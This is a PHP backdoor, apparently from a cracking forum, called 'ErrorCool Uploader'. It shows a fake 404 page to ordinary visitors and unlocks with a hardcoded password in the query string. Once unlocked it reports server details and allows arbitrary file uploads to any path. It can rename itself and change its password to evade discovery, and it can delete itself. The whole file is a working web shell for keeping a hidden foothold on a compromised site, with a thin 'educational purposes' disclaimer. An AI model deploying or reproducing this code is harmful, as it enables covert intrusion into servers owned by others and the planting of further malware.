<?php
session_start();


if (isset($_POST['newme']) && isset($_POST['newpasswd'])) {
    $newPassword = $_POST['newpasswd'];
    $newFileName = $_POST['newme'];

    if (!empty($newPassword)) {
        rename(__FILE__, $newFileName);

        $fileContent = file_get_contents($newFileName);
        $fileContent = str_replace('@1337', $newPassword, $fileContent);
        file_put_contents($newFileName, $fileContent);
        header("Location: $newFileName");
        exit();
    } 
}

function deleteScriptFile() {
    if (file_exists($filePath)) {
        unlink($filePath);
        echo '<div style="background-color: green; color: white; padding: 10px; margin-top: 10px;">ErrorCool Uploader file was Deleted Successfully!</div>';
    } else {
        echo '<div style="background-color: red; color: white; padding: 10px; margin-top: 10px;">ErrorCool Uploader not alive  anymore.</div>';
    }
}

if (isset($_GET["whoami"]) && $_GET["whoami"] == "@1337") {
    // POST Deleted ourself or move to hell
    if (isset($_POST['delete_script'])) {
        deleteScriptFile();
    }

    // LOGGED
    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ErrorCool Uploader</title>
        <style>
            body {
                background-color: #000;
                color: #fff;
                margin: 0;
                padding: 0;
                font-family: Arial, sans-serif;
            }

            .container {
                max-width: 800px;
                margin: 0 auto;
                padding: 20px;
                text-align: center;
            }

            .server-info {
                background-color: #22252A;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                margin-bottom: 20px;
                text-align: left;
                color: #fff;
            }

            .server-info h3 {
                color: #378CE7;
            }
            .form-container {
                background-color: #22252A;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                margin-bottom: 20px;
                text-align: center;
            }
            .form-container h3 {
                color: #378CE7;
                margin-bottom: 20px;
            }
            .form-container input[type="text"],
            .form-container input[type="password"],
            .form-container input[type="file"] {
                width: calc(100% - 20px);
                padding: 8px;
                margin: 8px;
                border: 1px solid #ccc;
                border-radius: 4px;
                box-sizing: border-box;
            }
            .submit-button {
                background-color: #5356FF;
                border: none;
                color: white;
                padding: 10px 20px;
                text-align: center;
                text-decoration: none;
                display: inline-block;
                font-size: 16px;
                margin: 4px 2px;
                cursor: pointer;
                border-radius: 8px;
            }
            .submit-button:hover {
                background-color: #378CE7;
            }
            .delete-button {
                background-color: #FF4F4F;
                border: none;
                color: white;
                padding: 10px 20px;
                text-align: center;
                text-decoration: none;
                display: inline-block;
                font-size: 16px;
                margin-top: 10px;
                cursor: pointer;
                border-radius: 8px;
            }
            .delete-button:hover {
                background-color: #E53935;
            }
            .snow-container {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: -1;
            }
            .snowflake {
                position: absolute;
                background-color: #fff;
                border-radius: 50%;
                animation: snowfall linear infinite;
            }
            @keyframes snowfall {
                0% {
                    transform: translateY(-10vh) rotate(0deg);
                }
                100% {
                    transform: translateY(110vh) rotate(360deg);
                }
            }
            .snowflake:nth-child(odd) {
                width: 4px;
                height: 4px;
                top: -5%;
                left: calc(100% * var(--rand-x));
                animation-duration: calc(8s * var(--rand-duration));
            }
            .snowflake:nth-child(even) {
                width: 6px;
                height: 6px;
                top: -10%;
                left: calc(100% * var(--rand-x));
                animation-duration: calc(12s * var(--rand-duration));
            }
            footer {
                background-color: #22252A;
                color: #fff;
                padding: 10px 20px;
                text-align: center;
                position: fixed;
                bottom: 0;
                width: 100%;
                box-shadow: 0 -4px 8px rgba(0, 0, 0, 0.1);
            }
            footer a {
                color: #378CE7;
                text-decoration: none;
                font-weight: bold;
            }
            footer a:hover {
                text-decoration: underline;
            }
            footer p {
                margin: 0;
                font-size: 14px;
            }
            .scrolling-message {
                white-space: nowrap; 
                overflow: hidden; 
                animation: slideleft 40s linear infinite; 
                margin-left: 40px; 
                font-size: 16px;
                max-width: 20; 
            }
            @keyframes slideleft {
                0% {
                    transform: translateX(100%);
                }
                100% {
                    transform: translateX(-100%);
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="server-info">
                <center>
                    <a href="https://drcrypter.ru">
                        <img src="https://i.pinimg.com/originals/dc/d8/d7/dcd8d7968e54b4d5ef50ba66e37512fe.gif" alt="Server Image">
                    </a>
                
                <h3>Server Information</h3></center>
                <div>
                    <b>Uname :</b> ' . php_uname() . '<br>
                    <b>SERVER APP :</b> ' . $_SERVER['SERVER_SOFTWARE'] . '<br>
                    <b>Safe Mode :</b> ' . (ini_get('safe_mode') ? '<span style="color: green;">On</span>' : '<span style="color: red;">Off</span>') . '<br>
                    <b>Server User :</b> ' . get_current_user() . '<br>
                    <b>Located :</b> ' . getcwd() . '<br>
                    <b>Date time :</b> ' . date('Y-m-d H:i:s') . '<br>
                </div>
            </div>

            <div class="form-container">
                <h3>Change Itself  &  PWD
                <form method="POST" action="">
                    <button type="submit" class="delete-button" name="delete_script">Delete Script</button>
                </form></h3> 
                <form method="POST" action="">
                    <div style="margin-bottom: 10px;">
                        <input type="text" name="newme" placeholder="Target Filename">
                        <input type="password" name="newpasswd" placeholder="Target Password">
                        <input type="submit" class="submit-button" value="Submit">
                    </div>
                </form>';
                            
                if (isset($_FILES["files"])) {
                    $files = $_FILES["files"];
                    if ($files["name"] != '') {
                        $path = isset($_REQUEST["path"]) ? $_REQUEST["path"] : './'; // currently directory
                        $fullpath = $path . basename($files["name"]);
                        if (move_uploaded_file($files['tmp_name'], $fullpath)) {
                            echo "<div style='margin-bottom: 10px; text-align: center;'>
                                    <a href='$fullpath' class='submit-button' style='background-color: #00E676; padding: 10px 20px; text-decoration: none; display: inline-block;'>
                                    Successfully Uploaded & Target Located </a></div>";
                        } else {
                            echo "<div class='delete-button' style='text-align: center;'>
                                <a >Failed Upload & Retry</a></div>";
                        }
                    }
                } else {
                    // Display the form unyet upload 
                    echo ' 
                        <form method="POST" enctype="multipart/form-data" action="">
                            <div style="margin-bottom: 10px;">
                                <input type="file" name="files" required>
                                <input type="submit" class="submit-button" name="submit" value="Upload" style="padding: 10px 20px; cursor: pointer;">
                            </div>
                        </form>
                    ';
                }
            '</div>
        <div class="snow-container">';
    
    // Snow 
    for ($i = 0; $i < 200; $i++) {
        echo '<div class="snowflake" style="--rand-x: ' . (rand(0, 100) / 100) . '; --rand-duration: ' . (rand(80, 120) / 100) . ';"></div>';
    }

    echo '</div> <!-- Closing snow-container -->
        </div> <!-- Closing container -->
        <footer>
            <p>Developed by Forums: <a href="https://drcrypter.ru">drcrypter.ru</a> <span style="color: red;">( Only for educational purposes and Risk Owner ) </span></p>
            <div class="scrolling-message">
                We developed ErrorCool Uploader PHP to Help with Manual Problem-Solving. Craft your own Tools with ErrorCool Uploader and Move files to Hidden Directories. Get Creative NOW !!! </div>
        </footer>
    </body>
    </html>';
} else {
    // Fake Display 404 page for unauthorized users :D
    $domain = $_SERVER['SERVER_NAME'];
    echo '<html>
            <head><title>404 Not Found</title></head>
            <body>
                <h1>Not Found</h1>
                <p>The requested URL was not found on this server.</p>
                <hr>
                <address>Apache/2.4.38 (Ubuntu) Server at ' . $domain . ' Port 443</address>
            </body>
          </html>';
}
?>

